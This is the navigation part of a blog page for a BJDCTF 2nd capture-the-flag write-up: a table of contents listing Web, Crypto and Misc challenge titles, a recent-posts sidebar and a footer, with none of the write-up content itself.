class="toc-number">1.2.</span> <span class="toc-text">[BJDCTF 2nd]old-hack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-duangShell"><span class="toc-number">1.3.</span> <span class="toc-text">[BJDCTF 2nd]duangShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">[BJDCTF 2nd]简单注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">1.5.</span> <span class="toc-text">[BJDCTF 2nd]假猪套天下第一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-Schro%CC%88dinger"><span class="toc-number">1.6.</span> <span class="toc-text">[BJDCTF 2nd]Schrödinger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89"><span class="toc-number">1.7.</span> <span class="toc-text">[BJDCTF 2nd]xss之光</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-EasyAspDotNet"><span class="toc-number">1.8.</span> <span class="toc-text">[BJDCTF 2nd]EasyAspDotNet#</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.9.</span> <span class="toc-text">[BJDCTF 2nd]文件探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-elementmaster"><span class="toc-number">1.10.</span> <span class="toc-text">[BJDCTF 2nd]elementmaster</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-rsa0"><span class="toc-number">2.1.</span> <span class="toc-text">[BJDCTF 2nd]rsa0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-rsa1"><span class="toc-number">2.2.</span> <span class="toc-text">[BJDCTF 2nd]rsa1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E7%81%B5%E8%83%BD%E7%B2%BE%E9%80%9A-y1ng"><span class="toc-number">2.3.</span> <span class="toc-text">[BJDCTF 2nd]灵能精通-y1ng</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-cat-flag"><span class="toc-number">2.4.</span> <span class="toc-text">[BJDCTF 2nd]cat_flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E8%80%81%E6%96%87%E7%9B%B2%E4%BA%86"><span class="toc-number">2.5.</span> <span class="toc-text">[BJDCTF 2nd]老文盲了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-Y1nglish-y1ng"><span class="toc-number">2.6.</span> <span class="toc-text">[BJDCTF 2nd]Y1nglish-y1ng#</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E7%87%95%E8%A8%80%E7%87%95%E8%AF%AD-y1ng"><span class="toc-number">2.7.</span> <span class="toc-text">[BJDCTF 2nd]燕言燕语-y1ng</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-A-Beautiful-Picture"><span class="toc-number">3.1.</span> <span class="toc-text">[BJDCTF 2nd]A_Beautiful_Picture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E5%B0%8F%E5%A7%90%E5%A7%90-y1ng"><span class="toc-number">3.2.</span> <span class="toc-text">[BJDCTF 2nd]小姐姐-y1ng</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-EasyBaBa"><span class="toc-number">3.3.</span> <span class="toc-text">[BJDCTF 2nd]EasyBaBa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E5%9C%A3%E7%81%AB%E6%98%AD%E6%98%AD-y1ng"><span class="toc-number">3.4.</span> <span class="toc-text">[BJDCTF 2nd]圣火昭昭-y1ng</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome 浏览器扩展开发初试"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome 浏览器扩展开发初试"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome 浏览器扩展开发初试">Chrome 浏览器扩展开发初试</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020小组招新有感"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020小组招新有感"/></a><div class="content"><a class="title" href="/abc8.html" title="2020小组招新有感">2020小组招新有感</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>